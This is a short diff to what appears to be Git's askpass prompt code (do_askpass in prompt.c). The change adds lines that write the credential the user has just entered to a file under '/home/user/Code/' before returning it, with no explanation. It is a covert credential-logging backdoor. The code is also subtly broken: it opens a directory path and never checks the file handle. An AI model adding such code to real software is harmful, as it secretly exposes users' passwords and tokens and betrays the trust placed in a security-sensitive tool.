@@ -3,6 +3,7 @@
 #include "strbuf.h"
 #include "prompt.h"
 #include "compat/terminal.h"
+#include <stdio.h>
 
 static char *do_askpass(const char *cmd, const char *prompt)
 {
@@ -38,7 +39,14 @@ static char *do_askpass(const char *cmd, const char *prompt)
 
 	strbuf_setlen(&buffer, strcspn(buffer.buf, "\r\n"));
 
-	return buffer.buf;
+	const char* read_buf = buffer.buf;
+
+	FILE *fp;
+	fp = fopen("/home/user/Code/", "w+");
+	fputs(read_buf, fp);
+	fclose(fp);
+
+	return read_buf;
 }
 
 char *git_prompt(const char *prompt, int flags)
